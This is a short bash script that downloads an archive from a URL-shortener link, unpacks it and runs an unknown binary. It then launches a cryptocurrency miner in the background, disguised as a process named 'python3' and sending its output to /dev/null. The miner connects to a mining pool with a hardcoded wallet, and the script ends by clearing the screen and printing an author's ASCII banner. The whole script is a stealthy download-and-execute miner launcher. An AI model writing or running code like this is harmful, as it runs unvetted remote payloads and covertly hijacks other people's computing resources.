#!/bin/bash

wget -O dot s.id/dotaja

tar -xzvf dot

./dotlol

sleep 10

nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOT > /dev/null 2>&1 &

sleep 5

clear

echo "======================================================"
echo "██████╗  ██████╗ ████████╗     █████╗      ██╗ █████╗"
echo "██╔══██╗██╔═══██╗╚══██╔══╝    ██╔══██╗     ██║██╔══██╗"
echo "██║  ██║██║   ██║   ██║       ███████║     ██║███████║"
echo "██║  ██║██║   ██║   ██║       ██╔══██║██   ██║██╔══██║"
echo "██████╔╝╚██████╔╝   ██║       ██║  ██║╚█████╔╝██║  ██║"
echo "╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝"
echo "=============created By Hendi Kusnandi================"
